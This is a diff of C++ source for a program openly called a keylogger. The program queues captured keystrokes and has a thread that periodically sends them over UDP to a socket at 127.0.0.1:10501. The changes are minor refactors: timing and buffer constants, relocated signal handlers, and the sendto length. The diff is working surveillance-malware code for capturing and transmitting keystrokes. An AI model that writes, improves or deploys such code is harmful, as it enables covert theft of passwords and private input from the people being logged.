@@ -22,8 +22,8 @@
 
 #define PORT 10501
 #define ADDRESS "127.0.0.1"
-#define INTERVAL 500
-#define MAX_KEYS_STORE 100
+#define INTERVAL 5000
+#define MAX_KEYS_STORE 1000
 #define SEPARATOR '\n'
 #define PID_FILE_NAME "client.pid"
 
@@ -137,6 +137,19 @@ bool check_daemon() {
 
 bool loop = true;
 
+void sigint_handler(int sig) {
+    std::cerr << "Stopping " << gettid() << '\n';
+    loop = false;
+}
+
+void set_signals_handlers() {
+//    signal(SIGKILL, sigint_handler);
+//    signal(SIGABRT, sigint_handler);
+    signal(SIGILL, sigint_handler);
+//    signal(SIGINT, sigint_handler);
+    signal(SIGTERM, sigint_handler);
+}
+
 std::vector<std::string> queue_keys = {};
 std::mutex queue_keys_mtx;
 
@@ -148,7 +161,7 @@ unsigned long add_to_queue_keys(const std::string &value) {
 
 void errno_abort(const char *header) {
     std::cerr << "Error on " << header << '\n';
-    exit(EXIT_FAILURE);
+    exit(1);
 }
 
 struct sockaddr_in send_addr{};
@@ -177,7 +190,7 @@ void send_keys() {
             message += key + SEPARATOR;
         }
         const char *cmessage = message.c_str();
-        if (sendto(socket_fd, cmessage, strlen(cmessage), 0,
+        if (sendto(socket_fd, cmessage, strlen(cmessage) + 1, 0,
                    (struct sockaddr *) &send_addr, sizeof send_addr) < 0)
             errno_abort("send");
         std::cerr << "Keys sent" << '\n';
@@ -200,21 +213,8 @@ void interval_sending() {
     }
 }
 
-void sigint_handler(int sig) {
-    std::cerr << "Stopping " << gettid() << '\n';
-    loop = false;
-}
-
-void set_signals_hendlers() {
-//    signal(SIGKILL, sigint_handler);
-//    signal(SIGABRT, sigint_handler);
-    signal(SIGILL, sigint_handler);
-//    signal(SIGINT, sigint_handler);
-    signal(SIGTERM, sigint_handler);
-}
-
 void keylogger(int keyboard) {
-    set_signals_hendlers();
+    set_signals_handlers();
 
     create_socket();
     std::thread thread_obj(interval_sending);
